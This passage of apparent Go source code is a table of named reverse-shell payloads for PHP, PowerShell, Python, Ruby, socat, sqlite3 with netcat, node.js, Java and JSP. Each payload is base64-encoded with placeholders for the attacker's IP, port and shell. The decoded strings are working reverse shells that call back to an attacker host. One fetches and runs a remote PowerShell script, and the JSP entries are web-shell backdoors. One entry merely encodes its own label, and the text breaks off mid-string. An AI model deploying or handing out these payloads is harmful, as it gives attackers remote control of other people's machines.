		"cGhwIC1yICckc29jaz1mc29ja29wZW4oInt7LklwfX0iLHt7LlBvcnR9fSk7cG9wZW4oInt7LlNoZWxsfX0gPCYzID4mMyAyPiYzIiwgInIiKTsn",
		[]string{"linux", "windows", "mac"},
	},
	{
		"PHP proc_open",
		"cGhwIC1yICckc29jaz1mc29ja29wZW4oInt7LklwfX0iLHt7LlBvcnR9fSk7JHByb2M9cHJvY19vcGVuKCJ7ey5TaGVsbH19IiwgYXJyYXkoMD0+JHNvY2ssIDE9PiRzb2NrLCAyPT4kc29jayksJHBpcGVzKTsn",
		[]string{"linux", "windows", "mac"},
	},
	{
		"Windows ConPty",
		"SUVYKElXUiBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYW50b25pb0NvY28vQ29uUHR5U2hlbGwvbWFzdGVyL0ludm9rZS1Db25QdHlTaGVsbC5wczEgLVVzZUJhc2ljUGFyc2luZyk7IEludm9rZS1Db25QdHlTaGVsbCB7ey5JcH19IHt7LlBvcnR9fQ==",
		[]string{"windows"},
	},
	{
		"PowerShell #1",
		"JExIT1NUID0gInt7LklwfX0iOyAkTFBPUlQgPSB7ey5Qb3J0fX07ICRUQ1BDbGllbnQgPSBOZXctT2JqZWN0IE5ldC5Tb2NrZXRzLlRDUENsaWVudCgkTEhPU1QsICRMUE9SVCk7ICROZXR3b3JrU3RyZWFtID0gJFRDUENsaWVudC5HZXRTdHJlYW0oKTsgJFN0cmVhbVJlYWRlciA9IE5ldy1PYmplY3QgSU8uU3RyZWFtUmVhZGVyKCROZXR3b3JrU3RyZWFtKTsgJFN0cmVhbVdyaXRlciA9IE5ldy1PYmplY3QgSU8uU3RyZWFtV3JpdGVyKCROZXR3b3JrU3RyZWFtKTsgJFN0cmVhbVdyaXRlci5BdXRvRmx1c2ggPSAkdHJ1ZTsgJEJ1ZmZlciA9IE5ldy1PYmplY3QgU3lzdGVtLkJ5dGVbXSAxMDI0OyB3aGlsZSAoJFRDUENsaWVudC5Db25uZWN0ZWQpIHsgd2hpbGUgKCROZXR3b3JrU3RyZWFtLkRhdGFBdmFpbGFibGUpIHsgJFJhd0RhdGEgPSAkTmV0d29ya1N0cmVhbS5SZWFkKCRCdWZmZXIsIDAsICRCdWZmZXIuTGVuZ3RoKTsgJENvZGUgPSAoW3RleHQuZW5jb2RpbmddOjpVVEY4KS5HZXRTdHJpbmcoJEJ1ZmZlciwgMCwgJFJhd0RhdGEgLTEpIH07IGlmICgkVENQQ2xpZW50LkNvbm5lY3RlZCAtYW5kICRDb2RlLkxlbmd0aCAtZ3QgMSkgeyAkT3V0cHV0ID0gdHJ5IHsgSW52b2tlLUV4cHJlc3Npb24gKCRDb2RlKSAyPiYxIH0gY2F0Y2ggeyAkXyB9OyAkU3RyZWFtV3JpdGVyLldyaXRlKCIkT3V0cHV0YG4iKTsgJENvZGUgPSAkbnVsbCB9IH07ICRUQ1BDbGllbnQuQ2xvc2UoKTsgJE5ldHdvcmtTdHJlYW0uQ2xvc2UoKTsgJFN0cmVhbVJlYWRlci5DbG9zZSgpOyAkU3RyZWFtV3JpdGVyLkNsb3NlKCk=",
		[]string{"windows"},
	},
	{
		"PowerShell #2",
		"cG93ZXJzaGVsbCAtbm9wIC1jICIkY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCd7ey5JcH19Jyx7ey5Qb3J0fX0pOyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc+ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCki",
		[]string{"windows"},
	},
	{
		"PowerShell #3",
		"cG93ZXJzaGVsbCAtbm9wIC1XIGhpZGRlbiAtbm9uaSAtZXAgYnlwYXNzIC1jICIkVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJ3t7LklwfX0nLCB7ey5Qb3J0fX0pOyROZXR3b3JrU3RyZWFtID0gJFRDUENsaWVudC5HZXRTdHJlYW0oKTskU3RyZWFtV3JpdGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIoJE5ldHdvcmtTdHJlYW0pO2Z1bmN0aW9uIFdyaXRlVG9TdHJlYW0gKCRTdHJpbmcpIHtbYnl0ZVtdXSRzY3JpcHQ6QnVmZmVyID0gMC4uJFRDUENsaWVudC5SZWNlaXZlQnVmZmVyU2l6ZSB8ICUgezB9OyRTdHJlYW1Xcml0ZXIuV3JpdGUoJFN0cmluZyArICdTSEVMTD4gJyk7JFN0cmVhbVdyaXRlci5GbHVzaCgpfVdyaXRlVG9TdHJlYW0gJyc7d2hpbGUoKCRCeXRlc1JlYWQgPSAkTmV0d29ya1N0cmVhbS5SZWFkKCRCdWZmZXIsIDAsICRCdWZmZXIuTGVuZ3RoKSkgLWd0IDApIHskQ29tbWFuZCA9IChbdGV4dC5lbmNvZGluZ106OlVURjgpLkdldFN0cmluZygkQnVmZmVyLCAwLCAkQnl0ZXNSZWFkIC0gMSk7JE91dHB1dCA9IHRyeSB7SW52b2tlLUV4cHJlc3Npb24gJENvbW1hbmQgMj4mMSB8IE91dC1TdHJpbmd9IGNhdGNoIHskXyB8IE91dC1TdHJpbmd9V3JpdGVUb1N0cmVhbSAoJE91dHB1dCl9JFN0cmVhbVdyaXRlci5DbG9zZSgpIg==",
		[]string{"windows"},
	},
	{
		"PowerShell #4 (TLS)",
		"JHNzbFByb3RvY29scyA9IFtTeXN0ZW0uU2VjdXJpdHkuQXV0aGVudGljYXRpb24uU3NsUHJvdG9jb2xzXTo6VGxzMTI7ICRUQ1BDbGllbnQgPSBOZXctT2JqZWN0IE5ldC5Tb2NrZXRzLlRDUENsaWVudCgne3suSXB9fScsIHt7LlBvcnR9fSk7JE5ldHdvcmtTdHJlYW0gPSAkVENQQ2xpZW50LkdldFN0cmVhbSgpOyRTc2xTdHJlYW0gPSBOZXctT2JqZWN0IE5ldC5TZWN1cml0eS5Tc2xTdHJlYW0oJE5ldHdvcmtTdHJlYW0sJGZhbHNlLCh7JHRydWV9IC1hcyBbTmV0LlNlY3VyaXR5LlJlbW90ZUNlcnRpZmljYXRlVmFsaWRhdGlvbkNhbGxiYWNrXSkpOyRTc2xTdHJlYW0uQXV0aGVudGljYXRlQXNDbGllbnQoJ2Nsb3VkZmxhcmUtZG5zLmNvbScsJG51bGwsJHNzbFByb3RvY29scywkZmFsc2UpO2lmKCEkU3NsU3RyZWFtLklzRW5jcnlwdGVkIC1vciAhJFNzbFN0cmVhbS5Jc1NpZ25lZCkgeyRTc2xTdHJlYW0uQ2xvc2UoKTtleGl0fSRTdHJlYW1Xcml0ZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVdyaXRlcigkU3NsU3RyZWFtKTtmdW5jdGlvbiBXcml0ZVRvU3RyZWFtICgkU3RyaW5nKSB7W2J5dGVbXV0kc2NyaXB0OkJ1ZmZlciA9IE5ldy1PYmplY3QgU3lzdGVtLkJ5dGVbXSA0MDk2IDskU3RyZWFtV3JpdGVyLldyaXRlKCRTdHJpbmcgKyAnU0hFTEw+ICcpOyRTdHJlYW1Xcml0ZXIuRmx1c2goKX07V3JpdGVUb1N0cmVhbSAnJzt3aGlsZSgoJEJ5dGVzUmVhZCA9ICRTc2xTdHJlYW0uUmVhZCgkQnVmZmVyLCAwLCAkQnVmZmVyLkxlbmd0aCkpIC1ndCAwKSB7JENvbW1hbmQgPSAoW3RleHQuZW5jb2RpbmddOjpVVEY4KS5HZXRTdHJpbmcoJEJ1ZmZlciwgMCwgJEJ5dGVzUmVhZCAtIDEpOyRPdXRwdXQgPSB0cnkge0ludm9rZS1FeHByZXNzaW9uICRDb21tYW5kIDI+JjEgfCBPdXQtU3RyaW5nfSBjYXRjaCB7JF8gfCBPdXQtU3RyaW5nfVdyaXRlVG9TdHJlYW0gKCRPdXRwdXQpfSRTdHJlYW1Xcml0ZXIuQ2xvc2UoKQ==",
		[]string{"windows"},
	},
	{
		"PowerShell #3 (Base64)",
		"UG93ZXJTaGVsbCAjMyAoQmFzZTY0KQ==",
		[]string{"windows"},
	},
	{
		"Python #1",
		"ZXhwb3J0IFJIT1NUPSJ7ey5JcH19IjtleHBvcnQgUlBPUlQ9e3suUG9ydH19O3B5dGhvbiAtYyAnaW1wb3J0IHN5cyxzb2NrZXQsb3MscHR5O3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgob3MuZ2V0ZW52KCJSSE9TVCIpLGludChvcy5nZXRlbnYoIlJQT1JUIikpKSk7W29zLmR1cDIocy5maWxlbm8oKSxmZCkgZm9yIGZkIGluICgwLDEsMildO3B0eS5zcGF3bigie3suU2hlbGx9fSIpJw==",
		[]string{"linux", "mac"},
	},
	{
		"Python #2",
		"cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgie3suSXB9fSIse3suUG9ydH19KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigie3suU2hlbGx9fSIpJw==",
		[]string{"linux", "mac"},
	},
	{
		"Python3 #1",
		"ZXhwb3J0IFJIT1NUPSJ7ey5JcH19IjtleHBvcnQgUlBPUlQ9e3suUG9ydH19O3B5dGhvbjMgLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oInt7LlNoZWxsfX0iKSc=",
		[]string{"linux", "mac"},
	},
	{
		"Python3 #2",
		"cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoInt7LklwfX0iLHt7LlBvcnR9fSkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oInt7LlNoZWxsfX0iKSc=",
		[]string{"linux", "mac"},
	},
	{
		"Python3 Windows",
		"aW1wb3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzLHRocmVhZGluZzsKZGVmIHMycChzLCBwKToKICAgIHdoaWxlIFRydWU6CiAgICAgICAgZGF0YSA9IHMucmVjdigxMDI0KQogICAgICAgIGlmIGxlbihkYXRhKSA+IDA6CiAgICAgICAgICAgIHAuc3RkaW4ud3JpdGUoZGF0YSkKICAgICAgICAgICAgcC5zdGRpbi5mbHVzaCgpCgpkZWYgcDJzKHMsIHApOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBzLnNlbmQocC5zdGRvdXQucmVhZCgxKSkKCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoInt7LklwfX0iLHt7LlBvcnR9fSkpCgpwPXN1YnByb2Nlc3MuUG9wZW4oWyJ7ey5TaGVsbH19Il0sIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlNURE9VVCwgc3RkaW49c3VicHJvY2Vzcy5QSVBFKQoKczJwX3RocmVhZCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXMycCwgYXJncz1bcywgcF0pCnMycF90aHJlYWQuZGFlbW9uID0gVHJ1ZQpzMnBfdGhyZWFkLnN0YXJ0KCkKCnAyc190aHJlYWQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1wMnMsIGFyZ3M9W3MsIHBdKQpwMnNfdGhyZWFkLmRhZW1vbiA9IFRydWUKcDJzX3RocmVhZC5zdGFydCgpCgp0cnk6CiAgICBwLndhaXQoKQpleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICBzLmNsb3NlKCk=",
		[]string{"windows"},
	},
	{
		"Python3 shortest",
		"cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgie3suSXB9fSIse3suUG9ydH19KSk7W29zLmR1cDIocy5maWxlbm8oKSxmKWZvciBmIGluKDAsMSwyKV07cHR5LnNwYXduKCJ7ey5TaGVsbH19Iikn",
		[]string{"linux"},
	},
	{
		"Ruby #1",
		"cnVieSAtcnNvY2tldCAtZSdzcGF3bigic2giLFs6aW4sOm91dCw6ZXJyXT0+VENQU29ja2V0Lm5ldygie3suSXB9fSIse3suUG9ydH19KSkn",
		[]string{"linux", "mac"},
	},
	{
		"Ruby no sh",
		"cnVieSAtcnNvY2tldCAtZSdleGl0IGlmIGZvcms7Yz1UQ1BTb2NrZXQubmV3KCJ7ey5JcH19Iiwie3suUG9ydH19Iik7bG9vcHtjLmdldHMuY2hvbXAhOyhleGl0ISBpZiAkXz09ImV4aXQiKTsoJF89fi9jZCAoLispL2k/KERpci5jaGRpcigkMSkpOihJTy5wb3BlbigkXyw/cil7fGlvfGMucHJpbnQgaW8ucmVhZH0pKXJlc2N1ZSBjLnB1dHMgImZhaWxlZDogI3skX30ifSc=",
		[]string{"linux", "mac"},
	},
	{
		"socat #1",
		"c29jYXQgVENQOnt7LklwfX06e3suUG9ydH19IEVYRUM6e3suU2hlbGx9fQ==",
		[]string{"linux", "mac"},
	},
	{
		"socat #2 (TTY)",
		"c29jYXQgVENQOnt7LklwfX06e3suUG9ydH19IEVYRUM6J3t7LlNoZWxsfX0nLHB0eSxzdGRlcnIsc2V0c2lkLHNpZ2ludCxzYW5l",
		[]string{"linux", "mac"},
	},
	{
		"sqlite3 nc mkfifo",
		"c3FsaXRlMyAvZGV2L251bGwgJy5zaGVsbCBybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfHt7LlNoZWxsfX0gLWkgMj4mMXxuYyB7ey5JcH19IHt7LlBvcnR9fSA+L3RtcC9mJw==",
		[]string{"linux", "mac"},
	},
	{
		"node.js",
		"cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ25jIC1lIHt7LlNoZWxsfX0ge3suSXB9fSB7ey5Qb3J0fX0nKQ==",
		[]string{"linux", "mac"},
	},
	{
		"node.js #2",
		"KGZ1bmN0aW9uKCl7DQogICAgdmFyIG5ldCA9IHJlcXVpcmUoIm5ldCIpLA0KICAgICAgICBjcCA9IHJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKSwNCiAgICAgICAgc2ggPSBjcC5zcGF3bigie3suU2hlbGx9fSIsIFtdKTsNCiAgICB2YXIgY2xpZW50ID0gbmV3IG5ldC5Tb2NrZXQoKTsNCiAgICBjbGllbnQuY29ubmVjdCh7ey5Qb3J0fX0sICJ7ey5JcH19IiwgZnVuY3Rpb24oKXsNCiAgICAgICAgY2xpZW50LnBpcGUoc2guc3RkaW4pOw0KICAgICAgICBzaC5zdGRvdXQucGlwZShjbGllbnQpOw0KICAgICAgICBzaC5zdGRlcnIucGlwZShjbGllbnQpOw0KICAgIH0pOw0KICAgIHJldHVybiAvYS87IC8vIFByZXZlbnRzIHRoZSBOb2RlLmpzIGFwcGxpY2F0aW9uIGZyb20gY3Jhc2hpbmcNCn0pKCk7",
		[]string{"linux", "mac", "windows"},
	},
	{
		"Java #1",
		"cHVibGljIGNsYXNzIHNoZWxsIHsKICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBtYWluKFN0cmluZ1tdIGFyZ3MpIHsKICAgICAgICBQcm9jZXNzIHA7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgcCA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoImJhc2ggLWMgJEB8YmFzaCAwIGVjaG8gYmFzaCAtaSA+JiAvZGV2L3RjcC97ey5JcH19L3t7LlBvcnR9fSAwPiYxIik7CiAgICAgICAgICAgIHAud2FpdEZvcigpOwogICAgICAgICAgICBwLmRlc3Ryb3koKTsKICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gZSkge30KICAgIH0KfQ==",
		[]string{"linux", "mac"},
	},
	{
		"Java #2",
		"cHVibGljIGNsYXNzIHNoZWxsIHsKICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBtYWluKFN0cmluZ1tdIGFyZ3MpIHsKICAgICAgICBQcm9jZXNzQnVpbGRlciBwYiA9IG5ldyBQcm9jZXNzQnVpbGRlcigiYmFzaCIsICItYyIsICIkQHwgYmFzaCAtaSA+JiAvZGV2L3RjcC97ey5JcH19L3t7LlBvcnR9fSAwPiYxIikKICAgICAgICAgICAgLnJlZGlyZWN0RXJyb3JTdHJlYW0odHJ1ZSk7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgUHJvY2VzcyBwID0gcGIuc3RhcnQoKTsKICAgICAgICAgICAgcC53YWl0Rm9yKCk7CiAgICAgICAgICAgIHAuZGVzdHJveSgpOwogICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7fQogICAgfQp9",
		[]string{"linux", "mac"},
	},
	{
		"Java #3",
		"aW1wb3J0IGphdmEuaW8uSW5wdXRTdHJlYW07CmltcG9ydCBqYXZhLmlvLk91dHB1dFN0cmVhbTsKaW1wb3J0IGphdmEubmV0LlNvY2tldDsKCnB1YmxpYyBjbGFzcyBzaGVsbCB7CiAgICBwdWJsaWMgc3RhdGljIHZvaWQgbWFpbihTdHJpbmdbXSBhcmdzKSB7CiAgICAgICAgU3RyaW5nIGhvc3QgPSAie3suSXB9fSI7CiAgICAgICAgaW50IHBvcnQgPSB7ey5Qb3J0fX07CiAgICAgICAgU3RyaW5nIGNtZCA9ICJ7ey5TaGVsbH19IjsKICAgICAgICB0cnkgewogICAgICAgICAgICBQcm9jZXNzIHAgPSBuZXcgUHJvY2Vzc0J1aWxkZXIoY21kKS5yZWRpcmVjdEVycm9yU3RyZWFtKHRydWUpLnN0YXJ0KCk7CiAgICAgICAgICAgIFNvY2tldCBzID0gbmV3IFNvY2tldChob3N0LCBwb3J0KTsKICAgICAgICAgICAgSW5wdXRTdHJlYW0gcGkgPSBwLmdldElucHV0U3RyZWFtKCksIHBlID0gcC5nZXRFcnJvclN0cmVhbSgpLCBzaSA9IHMuZ2V0SW5wdXRTdHJlYW0oKTsKICAgICAgICAgICAgT3V0cHV0U3RyZWFtIHBvID0gcC5nZXRPdXRwdXRTdHJlYW0oKSwgc28gPSBzLmdldE91dHB1dFN0cmVhbSgpOwogICAgICAgICAgICB3aGlsZSAoIXMuaXNDbG9zZWQoKSkgewogICAgICAgICAgICAgICAgd2hpbGUgKHBpLmF2YWlsYWJsZSgpID4gMCkKICAgICAgICAgICAgICAgICAgICBzby53cml0ZShwaS5yZWFkKCkpOwogICAgICAgICAgICAgICAgd2hpbGUgKHBlLmF2YWlsYWJsZSgpID4gMCkKICAgICAgICAgICAgICAgICAgICBzby53cml0ZShwZS5yZWFkKCkpOwogICAgICAgICAgICAgICAgd2hpbGUgKHNpLmF2YWlsYWJsZSgpID4gMCkKICAgICAgICAgICAgICAgICAgICBwby53cml0ZShzaS5yZWFkKCkpOwogICAgICAgICAgICAgICAgc28uZmx1c2goKTsKICAgICAgICAgICAgICAgIHBvLmZsdXNoKCk7CiAgICAgICAgICAgICAgICBUaHJlYWQuc2xlZXAoNTApOwogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICBwLmV4aXRWYWx1ZSgpOwogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHt9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcC5kZXN0cm95KCk7CiAgICAgICAgICAgIHMuY2xvc2UoKTsKICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gZSkge30KICAgIH0KfQ==",
		[]string{"windows", "linux", "mac"},
	},
	{
		"Java Web",
		"PCVADQpwYWdlIGltcG9ydD0iamF2YS5sYW5nLiosIGphdmEudXRpbC4qLCBqYXZhLmlvLiosIGphdmEubmV0LioiDQolID4NCjwlIQ0Kc3RhdGljIGNsYXNzIFN0cmVhbUNvbm5lY3RvciBleHRlbmRzIFRocmVhZA0Kew0KICAgICAgICBJbnB1dFN0cmVhbSBpczsNCiAgICAgICAgT3V0cHV0U3RyZWFtIG9zOw0KICAgICAgICBTdHJlYW1Db25uZWN0b3IoSW5wdXRTdHJlYW0gaXMsIE91dHB1dFN0cmVhbSBvcykNCiAgICAgICAgew0KICAgICAgICAgICAgICAgIHRoaXMuaXMgPSBpczsNCiAgICAgICAgICAgICAgICB0aGlzLm9zID0gb3M7DQogICAgICAgIH0NCiAgICAgICAgcHVibGljIHZvaWQgcnVuKCkNCiAgICAgICAgew0KICAgICAgICAgICAgICAgIEJ1ZmZlcmVkUmVhZGVyIGlzciA9IG51bGw7DQogICAgICAgICAgICAgICAgQnVmZmVyZWRXcml0ZXIgb3N3ID0gbnVsbDsNCiAgICAgICAgICAgICAgICB0cnkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBpc3IgPSBuZXcgQnVmZmVyZWRSZWFkZXIobmV3IElucHV0U3RyZWFtUmVhZGVyKGlzKSk7DQogICAgICAgICAgICAgICAgICAgICAgICBvc3cgPSBuZXcgQnVmZmVyZWRXcml0ZXIobmV3IE91dHB1dFN0cmVhbVdyaXRlcihvcykpOw0KICAgICAgICAgICAgICAgICAgICAgICAgY2hhciBidWZmZXJbXSA9IG5ldyBjaGFyWzgxOTJdOw0KICAgICAgICAgICAgICAgICAgICAgICAgaW50IGxlblJlYWQ7DQogICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSggKGxlblJlYWQgPSBpc3IucmVhZChidWZmZXIsIDAsIGJ1ZmZlci5sZW5ndGgpKSA+IDApDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zdy53cml0ZShidWZmZXIsIDAsIGxlblJlYWQpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvc3cuZmx1c2goKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBpb2UpDQogICAgICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoaXNyICE9IG51bGwpIGlzci5jbG9zZSgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYob3N3ICE9IG51bGwpIG9zdy5jbG9zZSgpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGlvZSkNCiAgICAgICAgfQ0KfQ0KJT4NCg0KPGgxPkpTUCBCYWNrZG9vciBSZXZlcnNlIFNoZWxsPC9oMT4NCg0KPGZvcm0gbWV0aG9kPSJwb3N0Ij4NCklQIEFkZHJlc3MNCjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJpcGFkZHJlc3MiIHNpemU9MzA+DQpQb3J0DQo8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icG9ydCIgc2l6ZT0xMD4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9IkNvbm5lY3QiIHZhbHVlPSJDb25uZWN0Ij4NCjwvZm9ybT4NCjxwPg0KPGhyPg0KDQo8JQ0KU3RyaW5nIGlwQWRkcmVzcyA9IHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJpcGFkZHJlc3MiKTsNClN0cmluZyBpcFBvcnQgPSByZXF1ZXN0LmdldFBhcmFtZXRlcigicG9ydCIpOw0KaWYoaXBBZGRyZXNzICE9IG51bGwgJiYgaXBQb3J0ICE9IG51bGwpDQp7DQogICAgICAgIFNvY2tldCBzb2NrID0gbnVsbDsNCiAgICAgICAgdHJ5DQogICAgICAgIHsNCiAgICAgICAgICAgICAgICBzb2NrID0gbmV3IFNvY2tldChpcEFkZHJlc3MsIChuZXcgSW50ZWdlcihpcFBvcnQpKS5pbnRWYWx1ZSgpKTsNCiAgICAgICAgICAgICAgICBSdW50aW1lIHJ0ID0gUnVudGltZS5nZXRSdW50aW1lKCk7DQogICAgICAgICAgICAgICAgUHJvY2VzcyBwcm9jID0gcnQuZXhlYygiY21kLmV4ZSIpOw0KICAgICAgICAgICAgICAgIFN0cmVhbUNvbm5lY3RvciBvdXRwdXRDb25uZWN0b3IgPQ0KICAgICAgICAgICAgICAgICAgICAgICAgbmV3IFN0cmVhbUNvbm5lY3Rvcihwcm9jLmdldElucHV0U3RyZWFtKCksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzb2NrLmdldE91dHB1dFN0cmVhbSgpKTsNCiAgICAgICAgICAgICAgICBTdHJlYW1Db25uZWN0b3IgaW5wdXRDb25uZWN0b3IgPQ0KICAgICAgICAgICAgICAgICAgICAgICAgbmV3IFN0cmVhbUNvbm5lY3Rvcihzb2NrLmdldElucHV0U3RyZWFtKCksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9jLmdldE91dHB1dFN0cmVhbSgpKTsNCiAgICAgICAgICAgICAgICBvdXRwdXRDb25uZWN0b3Iuc3RhcnQoKTsNCiAgICAgICAgICAgICAgICBpbnB1dENvbm5lY3Rvci5zdGFydCgpOw0KICAgICAgICB9DQogICAgICAgIGNhdGNoKEV4Y2VwdGlvbiBlKSANCn0NCiU+",
		[]string{"windows", "linux", "mac"},
	},
	{
		"Java Two Way",
		"PCUNCiAgICAvKg0KICAgICAqIFVzYWdlOiBUaGlzIGlzIGEgMiB3YXkgc2hlbGwsIG9uZSB3ZWIgc2hlbGwgYW5kIGEgcmV2ZXJzZSBzaGVsbC4gRmlyc3QsIGl0IHdpbGwgdHJ5IHRvIGNvbm5lY3QgdG8gYSBsaXN0ZW5lciAoYXRhY2tlciBtYWNoaW5lKSwgd2l0aCB0aGUgSVAgYW5kIFBvcnQgc3BlY2lmaWVkIGF0IHRoZSBlbmQgb2YgdGhlIGZpbGUuDQogICAgICogSWYgaXQgY2Fubm90IGNvbm5lY3QsIGFuIEhUTUwgd2lsbCBwcm9tcHQgYW5kIHlvdSBjYW4gaW5wdXQgY29tbWFuZHMgKHNoL2NtZCkgdGhlcmUgYW5kIGl0IHdpbGwgcHJvbXB0cyB0aGUgb3V0cHV0IGluIHRoZSBIVE1MLg0KICAgICAqIE5vdGUgdGhhdCB0aGlzIGxhc3QgZnVuY3Rpb25hbGl0eSBpcyBzbG93LCBzbyB0aGUgZmlyc3Qgb25lIChyZXZlcnNlIHNoZWxsKSBpcyByZWNvbW1lbmRlZC4gRWFjaCB0aW1lIHRoZSBidXR0b24gInNlbmQiIGlzIGNsaWNrZWQsIGl0IHdpbGwgdHJ5IHRvIGNvbm5lY3QgdG8gdGhlIHJldmVyc2Ugc2hlbGwgYWdhaW4gKGFwYXJ0IGZyb20gZXhlY3V0aW5nIA0KICAgICAqIHRoZSBjb21tYW5kIHNwZWNpZmllZCBpbiB0aGUgSFRNTCBmb3JtKS4gVGhpcyBpcyB0byBhdm9pZCB0byBrZWVwIGl0IHNpbXBsZS4NCiAgICAgKi8NCiU+DQoNCjwlQHBhZ2UgaW1wb3J0PSJqYXZhLmxhbmcuKiIlPg0KPCVAcGFnZSBpbXBvcnQ9ImphdmEuaW8uKiIlPg0KPCVAcGFnZSBpbXBvcnQ9ImphdmEubmV0LioiJT4NCjwlQHBhZ2UgaW1wb3J0PSJqYXZhLnV0aWwuKiIlPg0KDQo8aHRtbD4NCjxoZWFkPg0KICAgIDx0aXRsZT5qcnNoZWxsPC90aXRsZT4NCjwvaGVhZD4NCjxib2R5Pg0KPGZvcm0gTUVUSE9EPSJQT1NUIiBOQU1FPSJteWZvcm0iIEFDVElPTj0iIj4NCiAgICA8aW5wdXQgVFlQRT0idGV4dCIgTkFNRT0ic2hlbGwiPg0KICAgIDxpbnB1dCBUWVBFPSJzdWJtaXQiIFZBTFVFPSJTZW5kIj4NCjwvZm9ybT4NCjxwcmU+DQo8JQ0KICAgIC8vIERlZmluZSB0aGUgT1MNCiAgICBTdHJpbmc